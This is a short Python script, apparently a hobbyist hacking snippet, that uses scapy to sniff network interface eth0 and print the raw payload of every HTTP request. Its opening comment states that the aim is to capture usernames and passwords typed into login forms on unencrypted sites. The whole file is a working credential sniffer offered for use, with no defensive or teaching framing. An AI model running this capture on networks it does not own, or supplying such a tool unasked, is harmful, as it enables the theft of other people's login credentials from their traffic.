#This code is only for getting the "username and password" entered in the login part of the HTTP sites.
#Usually this "username and password" part will be in the "load" section

import scapy.all as scapy
from scapy_http import http


def sniff_network(interface):  
    scapy.sniff(iface=interface,store=False,prn=analyze_packets)    
         
         
def analyze_packets(packet):     
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):  
            print(packet[scapy.Raw].load)  


sniff_network("eth0")     


